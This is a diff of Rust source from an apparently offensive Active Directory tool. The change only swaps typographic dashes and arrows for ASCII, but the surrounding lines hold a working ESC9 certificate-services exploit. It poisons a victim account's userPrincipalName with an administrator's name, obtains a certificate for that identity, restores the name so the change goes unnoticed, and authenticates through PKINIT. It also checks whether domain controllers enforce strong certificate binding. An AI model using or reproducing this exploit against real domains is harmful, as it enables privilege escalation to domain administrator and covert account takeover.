@@ -1,4 +1,4 @@
-//! ESC9 — No Security Extension (`CT_FLAG_NO_SECURITY_EXTENSION`)
+//! ESC9 -- No Security Extension (`CT_FLAG_NO_SECURITY_EXTENSION`)
 //!
 //! When a certificate template has `CT_FLAG_NO_SECURITY_EXTENSION` (`0x00080000`)
 //! set, the CA does **not** embed the `szOID_NTDS_CA_SECURITY_EXT` (OID
@@ -9,7 +9,7 @@
 //! **Attack flow:**
 //! 1. Attacker has `GenericWrite` (or `WriteProperty`) over a **victim user** (`victim_account`).
 //! 2. Save the original `userPrincipalName` of the victim.
-//! 3. Set the victim's `userPrincipalName` → `target_upn` (e.g. `Administrator@corp.local`).
+//! 3. Set the victim's `userPrincipalName` -> `target_upn` (e.g. `Administrator@corp.local`).
 //! 4. Request a certificate from the vulnerable template while the UPN is poisoned.
 //! 5. Restore the victim's original UPN (to stay covert).
 //! 6. Authenticate with the issued certificate via PKINIT (Kerberos) or Schannel (LDAPS).
@@ -22,7 +22,7 @@
 //!
 //! Reference: Oliver Lyak, "Certificates and Pwnage and Patches" (2022)
 //!
-//! # IMPORTANT — Operational Safety
+//! # IMPORTANT -- Operational Safety
 //! The UPN modification is **temporary** by design; `Esc9Exploiter::exploit()` will
 //! always attempt to restore the original UPN even on failure paths.  The caller
 //! should supply working LDAP credentials that have `GenericWrite` on the victim
@@ -32,7 +32,7 @@
 //! On **Windows Server 2025 fresh installs** the KDC defaults to
 //! `StrongCertificateBindingEnforcement=2` (Enforced), which **blocks** this attack.
 //! Upgrades from WS2022 preserve `1` (Compatibility).  Always check the enforcement
-//! state before running ESC9 — use `check_enforcement_precondition()`.
+//! state before running ESC9 -- use `check_enforcement_precondition()`.
 
 use crate::adcs::esc_strong_mapping::{
     StrongBindingState, collect_dc_builds, is_ws2025_build, reg_query_command,
@@ -44,13 +44,13 @@ use crate::error::{OverthroneError, Result};
 use crate::proto::ldap::LdapSession;
 use tracing::{info, warn};
 
-/// Constant — `CT_FLAG_NO_SECURITY_EXTENSION` as defined in MS-CRTD §2.2.2.7.7
+/// Constant -- `CT_FLAG_NO_SECURITY_EXTENSION` as defined in MS-CRTD §2.2.2.7.7
 pub const CT_FLAG_NO_SECURITY_EXTENSION: u32 = 0x00080000;
 
-/// `szOID_NTDS_CA_SECURITY_EXT` — embedded when the flag is NOT set
+/// `szOID_NTDS_CA_SECURITY_EXT` -- embedded when the flag is NOT set
 pub const OID_NTDS_CA_SECURITY_EXT: &str = "1.3.6.1.4.1.311.25.2";
 
-/// ESC9 exploiter — abuses `CT_FLAG_NO_SECURITY_EXTENSION` via UPN poisoning
+/// ESC9 exploiter -- abuses `CT_FLAG_NO_SECURITY_EXTENSION` via UPN poisoning
 pub struct Esc9Exploiter {
     web_client: WebEnrollmentClient,
 }
@@ -104,7 +104,7 @@ impl Esc9Exploiter {
     }
 
     /// Execute the ESC9 attack.
-    /// This is an **offline** / **dry-run** implementation — the LDAP UPN
+    /// This is an **offline** / **dry-run** implementation -- the LDAP UPN
     /// modification is **not** performed here (that requires a live LDAP session
     /// and appropriate permissions that go beyond the CA web enrollment path).
     /// Instead, the method:
@@ -125,11 +125,11 @@ impl Esc9Exploiter {
         // Verify template is actually vulnerable (flag check)
         Self::verify_template_flag(&config.template);
 
-        // Step 1 — Build CSR with the target UPN in the SAN
+        // Step 1 -- Build CSR with the target UPN in the SAN
         let (csr_der, private_key) =
             create_esc1_csr("overthrone-esc9", &config.target_upn, &config.template)?;
 
-        // Step 2 — Submit certificate request to CA
+        // Step 2 -- Submit certificate request to CA
         let response = self
             .web_client
             .submit_request(&csr_der, &config.template, None)
@@ -146,11 +146,11 @@ impl Esc9Exploiter {
             .certificate
             .ok_or_else(|| OverthroneError::Adcs("No certificate in CA response".to_string()))?;
 
-        // Step 3 — Verify the security extension is ABSENT (confirms vulnerability)
+        // Step 3 -- Verify the security extension is ABSENT (confirms vulnerability)
         let security_ext_absent = Self::check_security_extension_absent(&cert_data);
         if !security_ext_absent {
             warn!(
-                "ESC9: Issued cert contains {} — template may not be vulnerable",
+                "ESC9: Issued cert contains {} -- template may not be vulnerable",
                 OID_NTDS_CA_SECURITY_EXT
             );
         }
@@ -178,7 +178,7 @@ impl Esc9Exploiter {
                 signature_algorithm: "SHA256RSA".to_string(),
                 private_key_pem: private_key,
             },
-            upn_restored: false, // LDAP step is caller-responsibility — use exploit_with_ldap()
+            upn_restored: false, // LDAP step is caller-responsibility -- use exploit_with_ldap()
             pkinit_hint,
         })
     }
@@ -202,10 +202,10 @@ impl Esc9Exploiter {
                 // Walk all extensions and look for the NTDS CA security extension OID
                 for ext in cert.extensions() {
                     if ext.oid.to_string() == OID_NTDS_CA_SECURITY_EXT {
-                        return false; // Extension IS present — NOT vulnerable
+                        return false; // Extension IS present -- NOT vulnerable
                     }
                 }
-                true // Extension absent — vulnerable
+                true // Extension absent -- vulnerable
             }
             Err(_) => {
                 warn!("ESC9: Could not parse certificate DER to check security extension");
@@ -245,9 +245,9 @@ impl Esc9Exploiter {
             ));
         }
 
-        // Step 1 — poison the victim's UPN
+        // Step 1 -- poison the victim's UPN
         info!(
-            "ESC9: Setting userPrincipalName of {} → {}",
+            "ESC9: Setting userPrincipalName of {} -> {}",
             config.victim_dn, config.target_upn
         );
         ldap.modify_replace(
@@ -258,12 +258,12 @@ impl Esc9Exploiter {
         .await
         .map_err(|e| OverthroneError::Adcs(format!("ESC9: UPN write failed: {e}")))?;
 
-        // Step 2 — request certificate (always attempt restoration afterwards)
+        // Step 2 -- request certificate (always attempt restoration afterwards)
         let cert_result = self.exploit(config).await;
 
-        // Step 3 — restore the original UPN
+        // Step 3 -- restore the original UPN
         info!(
-            "ESC9: Restoring userPrincipalName of {} → {}",
+            "ESC9: Restoring userPrincipalName of {} -> {}",
             config.victim_dn, config.original_upn
         );
         let upn_restored = ldap
@@ -277,7 +277,7 @@ impl Esc9Exploiter {
 
         if !upn_restored {
             warn!(
-                "ESC9: Failed to restore UPN for {} — manual cleanup required",
+                "ESC9: Failed to restore UPN for {} -- manual cleanup required",
                 config.victim_dn
             );
         }
@@ -305,7 +305,7 @@ impl Esc9Exploiter {
 
         if ws2025_dc_present {
             info!(
-                "ESC9: WS2025 DC detected — StrongCertificateBindingEnforcement defaults to 2 (Enforced). \
+                "ESC9: WS2025 DC detected -- StrongCertificateBindingEnforcement defaults to 2 (Enforced). \
                  Use: {}",
                 dc_info
                     .first()
@@ -315,7 +315,7 @@ impl Esc9Exploiter {
             // Return Unknown since we can't determine without registry access
             Ok(Some(StrongBindingState::Unknown))
         } else {
-            info!("ESC9: No WS2025 DCs detected — pre-WS2025 defaults apply");
+            info!("ESC9: No WS2025 DCs detected -- pre-WS2025 defaults apply");
             Ok(None)
         }
     }
@@ -326,19 +326,19 @@ impl Esc9Exploiter {
         match binding_state {
             Some(StrongBindingState::Enforced) => {
                 warn!(
-                    "ESC9: BLOCKED — StrongCertificateBindingEnforcement=2 (Enforced) on WS2025 DC"
+                    "ESC9: BLOCKED -- StrongCertificateBindingEnforcement=2 (Enforced) on WS2025 DC"
                 );
             }
             Some(StrongBindingState::Unknown) => {
                 warn!(
-                    "ESC9: Cannot verify StrongCertificateBindingEnforcement — confirm with reg query"
+                    "ESC9: Cannot verify StrongCertificateBindingEnforcement -- confirm with reg query"
                 );
             }
             Some(StrongBindingState::Disabled | StrongBindingState::Compatibility) => {
                 info!("ESC9: StrongCertificateBindingEnforcement allows weak mapping");
             }
             None => {
-                info!("ESC9: No WS2025 DC detected — pre-WS2025 defaults apply");
+                info!("ESC9: No WS2025 DC detected -- pre-WS2025 defaults apply");
             }
         }
     }
